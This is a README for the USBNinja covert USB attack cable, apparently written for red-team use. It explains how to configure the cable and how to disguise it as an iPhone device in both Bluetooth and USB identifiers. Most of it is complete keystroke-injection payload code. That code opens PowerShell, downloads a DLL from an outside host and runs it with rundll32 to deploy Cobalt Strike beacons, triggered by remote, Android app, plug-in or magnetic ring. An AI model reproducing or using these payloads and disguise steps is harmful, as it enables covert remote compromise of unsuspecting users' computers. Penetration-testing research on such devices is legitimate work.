# USBNinja

USBNinja is an information security and penetration testing device that looks and functions just like a regular USB cable (both power and data) until a wireless remote control triggers execution of a pre-configured payload. [Official website](https://usbninja.com/).

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/cable_usb.jpg" />

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/cable_lightning.jpg" />

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/ring_remote.jpg" />

##### Speed

For typing 100 characters it takes __1.631__ seconds. This test prints `100 - len(date +"%T.%N")` characters and counts the time:

```text
[user ~]$ date +"%T.%N"
10:39:44.782886980
[user ~]$ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
bash: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: command not found
[user ~]$ date +"%T.%N"
10:39:46.414577471
```

### How to use

Official [guide](https://usbninja.com/help/).

##### Installing Arduino IDE

Download and install Arduino [software](https://www.arduino.cc/en/Main/Software). Version used in this readme - 1.8.9 (Windows Store 1.8.21.0).

##### Installing USBNinja driver

Download and install USBNinja [driver](https://usbninja.com/drivers_tools/USBninja_BOOT_driver.zip). Version used in this readme can be found [here](https://github.com/4d4c/USBNinjaraw/branch/master/install_files/USBninja_BOOT_driver.exe).

##### Setting up Arduino IDE for USBNinja

Start Arduino IDE and select __File__ -> __Preferences__ menu.

Add USBNinja Boards Manager URL (copy of the version used in this readme can be found [here](https://github.com/4d4c/USBNinjasrc/branch/master/install_files/package_USBNinja_index.json)):

```text
http://usbninja.com/arduino/package_USBNinja_index.json
```

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/arduino_ide_preferences_url.png" />

Select __Tools__ -> __Board__ -> __Board Manager__. In __Board Manager__ menu select __Contributed__ from dropdown. Select __USB Ninja by RRG__ package and click __Install__.

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/arduino_ide_boards_manager.png" />

Close __Board Manager__. From __Tools__ -> __Board__ menu select __USB Ninja cable__.

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/arduino_ide_boards_manager_usbninja.png" />

##### Changing Bluetooth name and password of USBNinja

By default USBNinja cable has "Ninja" as its Bluetooth device name (this name is visible to anyone in range of the cable) and 8888 as its PIN for Bluetooth pairing. To change these values we need to reconfigure both the cable and the remote control.

###### Changing name and password of USBNinja cable

In Arduino IDE go to __File__ -> __Examples__ -> __NinjaBLESetup__ -> __NinjaBLESetup__. In `setup()` function set name and password you want to use (file example can be found [here](https://github.com/4d4c/USBNinjasrc/branch/master/payload_examples/cable_setup/cable_setup.ino)):

```c
SetBLE("John's iPhone", "4379");
```

Disconnect the cable from your computer, press __Verify__ button (top left). For unknown reasons it may fail on the first run. Try verifying the code again and if the code is correct you should get something like this:

```text
Sketch uses 4688 bytes (79%) of program storage space. Maximum is 5882 bytes.
Global variables use 157 bytes of dynamic memory.
```

Press __Upload__ button (top left) and connect USBNinja cable to your machine __while holding magnetic ring next to the USB plastic shell__. After two seconds you can remove the ring. You will see terminal output about starting erasing/writing your settings to the cable.

```text
Sketch uses 4686 bytes (79%) of program storage space. Maximum is 5882 bytes.
Global variables use 155 bytes of dynamic memory.
> Please plug in the USBNinja device ...
> Device is found!
connecting: 16% complete
connecting: 22% complete
connecting: 28% complete
connecting: 33% complete
> Available space for user application: 5882 bytes
> Suggested sleep time between sending pages: 8ms
> Whole page count: 92
> Erase function sleep duration: 736ms
parsing: 50% complete
> Erasing the memory ...
erasing: 55% complete
erasing: 60% complete
erasing: 65% complete
> Starting to upload ...
writing: 70% complete
writing: 75% complete
writing: 80% complete
> Starting the user app ...
running: 100% complete
>> Upload to USBNinja done. Thank you!
```

###### Changing name and password of USBNinja remote control

To change the name and the password of USBNinja remote control you need to download [USBNinjaTransmiterToolsV1.0.zip](https://usbninja.com/drivers_tools/USBNinjaTransmiterToolsV1.0.zip). The version used in this readme can be found [here](https://github.com/4d4c/USBNinjaraw/branch/master/install_files/USBNinjaTransmiterToolsV1.0.zip). Unzip the archive, start the tool and connect remote control to your machine with the micro USB cable.

Select the serial port of the remote control and click __OPEN__. Set the name and password that you're using for USBNinja cable and press __SET BLE NAME__ and __SET BLE PASSWORD__. After name and password were set press __CLOSE__ button. If the tool is not detecting the remote control, try installing drivers from the zip archive.

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/usbninja_transmitter.png" />

##### Changing USBNinja keyboard device name

By default USBNinja has "USB Ninja Keyboard" as a name.

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/windows_usb_ninja.png" />

To change this name you need to change USB driver configurations located in `C:\Users\User\Documents\ArduinoData\packages\USBNinja\hardware\avr\1.0.2\libraries\NinjaKeyboard\include\usbconfig.h`

Default values are:

```c
#define USB_CFG_VENDOR_NAME     'h','t','t','p','s',':','/','/','u','s','b','n','i','n','j','a','.','c','o','m','/'
#define USB_CFG_VENDOR_NAME_LEN 21
/* These two values define the vendor name returned by the USB device. The name
 * must be given as a list of characters under single quotes. The characters
 * are interpreted as Unicode (UTF-16) entities.
 * If you don't want a vendor name string, undefine these macros.
 * ALWAYS define a vendor name containing your Internet domain name if you use
 * obdev's free shared VID/PID pair. See the file USB-IDs-for-free.txt for
 * details.
 */
#define USB_CFG_DEVICE_NAME     'U','S','B',' ','N','i','n','j','a',' ','K','e','y','b','o','a','r','d'
#define USB_CFG_DEVICE_NAME_LEN 18
/* Same as above for the device name. If you don't want a device name, undefine
 * the macros. See the file USB-IDs-for-free.txt before you assign a name if
 * you use a shared VID/PID.
 */
```

Change this value to something generic :

```c
#define USB_CFG_VENDOR_NAME     'h','t','t','p','s',':','/','/','i','p','h','o','n','e','.','c','c','/'
#define USB_CFG_VENDOR_NAME_LEN 18
...
#define USB_CFG_DEVICE_NAME     'i','P','h','o','n','e',' ','A','p','p','l','e'
#define USB_CFG_DEVICE_NAME_LEN 12
```

After changing these values you need to re-upload your payload to USBNinja cable for changes to take effect.

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/windows_iphone.png" />

-----

### Uploading code to USBNinja cable

To upload any code to USBNinja you need to press __Upload__ button (top left) and connect USBNinja cable to your machine __while holding magnetic ring next to the USB plastic shell__ (USB connector). After two seconds you can remove the ring. You will see terminal output about starting erasing/writing your settings to the cable.

---

### Cobalt Strike payload (remote control)

Due to memory limitations of USBNinja board we can't use Cobalt Strike PowerShell command payload. From testing it seems that we can put approximately 2000 characters in the payload and Cobalt Strike PowerShell payload command is approximately 6000 characters. Due to that we will run download and execute command as our payload.

Remote control's range is approximately ten meters (tested though the wall).

We will create HTTPS beacon deployment on button __A__ (payloadA() function) and DNS beacon deployment on button __B__ (payloadB() function).

First part of the payload is defining the correct keyboard layout. All available keyboard layouts:

```text
#define LAYOUT_US_ENGLISH
#define LAYOUT_CANADIAN_FRENCH
#define LAYOUT_CANADIAN_MULTILINGUAL
#define LAYOUT_DANISH
#define LAYOUT_FINNISH
#define LAYOUT_FRENCH
#define LAYOUT_FRENCH_BELGIAN
#define LAYOUT_FRENCH_SWISS
#define LAYOUT_GERMAN
#define LAYOUT_GERMAN_MAC
#define LAYOUT_GERMAN_SWISS
#define LAYOUT_ICELANDIC
#define LAYOUT_IRISH
#define LAYOUT_ITALIAN
#define LAYOUT_NORWEGIAN
#define LAYOUT_PORTUGUESE
#define LAYOUT_PORTUGUESE_BRAZILIAN
#define LAYOUT_SPANISH
#define LAYOUT_SPANISH_LATIN_AMERICA
#define LAYOUT_SWEDISH
#define LAYOUT_TURKISH
#define LAYOUT_UNITED_KINGDOM
#define LAYOUT_US_INTERNATIONAL
```

We need to include NinjaKeyboard header file:

```c
#include <NinjaKeyboard.h>
```

Function `setup` and `loop` can be left empty (these functions are used for "run on connect" payloads):

```c
void setup() {
}

void loop() {
}
```

As an example we will use DownloadFile PowerShell command:

```powershell
(New-Object System.Net.WebClient).DownloadFile("http://192.168.1.100:8081/https.dll", "C:\Users\Public\Documents\https.dll")
```

Full payloadA() function:

```c
void payloadA() {
    // Initiate keyboard
    USBninjaOnline();
    NinjaKeyboard.begin();
    NinjaKeyboard.delay(1000);
    // Send HID '0' to compatibility Win7
    NinjaKeyboard.sendKeyStroke(0);
    NinjaKeyboard.delay(1000);
    // WIN + R
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    NinjaKeyboard.delay(100);
    // Start PowerShell
    NinjaKeyboard.print(F("powershell.exe"));
    NinjaKeyboard.delay(100);
    // ENTER
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(500);
    // Download, execute payload and exit powershell
    NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://192.168.1.100:8081/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
    NinjaKeyboard.delay(100);
    // Stop and remove keyboard
    NinjaKeyboard.end();
    USBninjaOffline();
}
```

Same functionality but with different download location will be used for DNS payload:

```c
void payloadB() {
    // Initiate keyboard
    USBninjaOnline();
    NinjaKeyboard.begin();
    NinjaKeyboard.delay(1000);
    // Send HID '0' to compatibility Win7
    NinjaKeyboard.sendKeyStroke(0);
    NinjaKeyboard.delay(1000);
    // WIN + R
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    NinjaKeyboard.delay(100);
    // Start PowerShell
    NinjaKeyboard.print(F("powershell.exe"));
    NinjaKeyboard.delay(100);
    // ENTER
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(500);
    // Download, execute payload and exit powershell
    NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://192.168.1.100:8081/dns.dll\", \"C:\\Users\\Public\\Documents\\dns.dll\"); rundll32 C:\\Users\\Public\\Documents\\dns.dll,Start; exit"));
    NinjaKeyboard.delay(100);
    // Stop and remove keyboard
    NinjaKeyboard.end();
    USBninjaOffline();
}
```

Full code file can be found [here](https://github.com/4d4c/USBNinjasrc/branch/master/payload_examples/bluetooth_powershell_command/bluetooth_powershell_command.ino) (to save memory we can rewrite both functions to call a generic function with download URL as an argument).

----

### Cobalt Strike payload (Android app)

Payload from [Cobalt Strike payload (remote control)](#cobalt-strike-payload-remote-control) can be re-used. Range of the Android App is the same as of the remote control (tested on Samsung S5).

Download APK file from [here](https://usbninja.com/drivers_tools/USBNinja.apk). Version used in this readme can be found [here](https://github.com/4d4c/USBNinjaraw/branch/master/install_files/USBNinja.apk).

Install APK file on Android phone. If you changed default password for USBNinja cable change it in __password__ menu (top right). After scanning pick the device.

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/device_search.png" />

In here you will be able to execute commands the same way as with the remote control.

<img src ="https://github.com/4d4c/USBNinjaraw/branch/master/images/device_action.png" />

---

### Cobalt Strike payload (run on connection)

USBNinja can also be used in RubberDucky mode and execute payload as soon as it's connected. To do this we can use the same payload but place it in `loop()` function.

As by default Arduino is executing everything in loop() function in a infinite loop, but we can add a flag that would check if we already executed the payload. To do this we need to create a flag outside of `loop()` function:

```c
bool execute_once = true;
```

Now we need to add a check in `loop()` function:

```c
void loop() {
    // Check if we already executed the payload
    if (execute_once) {
        // Initiate keyboard
        USBninjaOnline();
        NinjaKeyboard.begin();
        NinjaKeyboard.delay(1000);
        // Send HID '0' to compatibility Win7
        NinjaKeyboard.sendKeyStroke(0);
        NinjaKeyboard.delay(1000);
        // WIN + R
        NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
        NinjaKeyboard.delay(100);
        // Start PowerShell
        NinjaKeyboard.print(F("notepad.exe"));
        NinjaKeyboard.delay(100);
        // ENTER
        NinjaKeyboard.sendKeyStroke(KEY_ENTER);
        NinjaKeyboard.delay(500);
        // Download, execute payload and exit powershell
        NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://192.168.1.100:8081/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
        NinjaKeyboard.delay(100);
        // Stop and remove keyboard
        NinjaKeyboard.end();
        USBninjaOffline();

        // Set flag
        execute_once = false;
    }
}
```

Please note, that during testing USBNinja started executing payload as soon as it finished uploading, so try not to spawn any beacons on your machine.

Full code file can be found [here](https://github.com/4d4c/USBNinjasrc/branch/master/payload_examples/powershell_command/powershell_command.ino).

---

### Cobalt Strike payload (ring activation)

USBNinja can also be activated using magnetic ring. To do this we will check the pin state in `loop()` function. First we need to configure the pin mode in `setup()` function:

```c
void setup() {
    pinMode(USBDIRECTPIN, INPUT);
}
```

Now we need to check for the pin state in `loop()` function:

```c
void loop() {
    //If a magnet is near, Pin 0 will turn to low
    if (digitalRead(USBDIRECTPIN) == LOW) {
        pinMode(USBDIRECTPIN, OUTPUT);

        // Initiate keyboard
        USBninjaOnline();
        NinjaKeyboard.begin();
        NinjaKeyboard.delay(1000);
        // Send HID '0' to compatibility Win7
        NinjaKeyboard.sendKeyStroke(0);
        NinjaKeyboard.delay(1000);
        // WIN + R
        NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
        NinjaKeyboard.delay(100);
        // Start PowerShell
        NinjaKeyboard.print(F("powershell.exe"));
        NinjaKeyboard.delay(100);
        // ENTER
        NinjaKeyboard.sendKeyStroke(KEY_ENTER);
        NinjaKeyboard.delay(500);
        // Download, execute payload and exit powershell
        NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://192.168.1.100:8081/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
        NinjaKeyboard.delay(100);
        // Stop and remove keyboard
        NinjaKeyboard.end();
        USBninjaOffline();

        pinMode(USBDIRECTPIN,INPUT);
    }
}
```

Don't forget to remove the ring after two seconds when uploading code or it can trigger payload on your machine.

Full code file can be found [here](https://github.com/4d4c/USBNinjasrc/branch/master/payload_examples/ring_powershell_command/ring_powershell_command.ino).
